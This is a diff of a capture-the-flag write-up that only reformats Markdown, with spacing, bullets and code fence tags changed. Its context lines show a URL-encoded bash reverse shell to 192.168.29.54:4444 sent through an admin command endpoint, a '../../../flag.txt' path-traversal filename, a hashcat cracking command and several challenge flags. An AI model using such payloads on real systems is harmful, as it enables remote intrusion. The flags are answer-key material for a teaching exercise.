@@ -71,7 +71,6 @@ flag{c50d82c0a25f3e644d0702b41dbd085a}
 ![Screenshot 2025-02-28 200146.png](Files/Screenshot_2025-02-28_200146.png)
 
 ```
-
 flag{90bc54705794a62015369fd8e86e557b}
 ```
 
@@ -403,7 +402,6 @@ admin_port = find_admin_port()
 
 ```php
 /admin/execute?cmd=bash%20-c%20%27bash%20-i%20%3E&%20/dev/tcp/192.168.29.54/4444%200%3E&1%27
-
 ```
 
 - I spent time trying to determine if the unfurler was making proper HTTP requests or if there were additional protections in place.
@@ -530,7 +528,7 @@ Stored Name: ../../../flag.txt
 
 ![Screenshot 2025-02-28 204710.png](Files/Screenshot_2025-02-28_204710.png)
 
-This way i got the Flag
+- This way i got the Flag
 
 ![Screenshot 2025-02-28 204721.png](Files/Screenshot_2025-02-28_204721.png)
 
@@ -542,7 +540,7 @@ flag{52948d88ee74b9bdab130c35c88bd406}
 
 ![Screenshot 2025-02-28 204912.png](Files/Screenshot_2025-02-28_204912.png)
 
-Given File: Challange.zip
+- Given File: Challange.zip
 
 [Weblog.zip](/uploads/Snyk_2025/Weblog.zip)
 
@@ -612,7 +610,7 @@ hashcat -m 0 c1b8b03c5a1b6d4dcec9a852f85cac59 /usr/share/wordlists/rockyou.txt
 
 ![Screenshot 2025-02-28 205941.png](Files/Screenshot_2025-02-28_205941.png)
 
-```bash
+```
 flag{b06fbe98752ab13d0fb8414fb55940f3}
 ```
 
@@ -1593,7 +1591,7 @@ sed 's/09ff01065c//g'
     ![image.png](Files/image%2068.png)
     
 
-```bash
+```
 flag{b5be72ab7e0254c056ffb57a0db124ce}
 ```
 
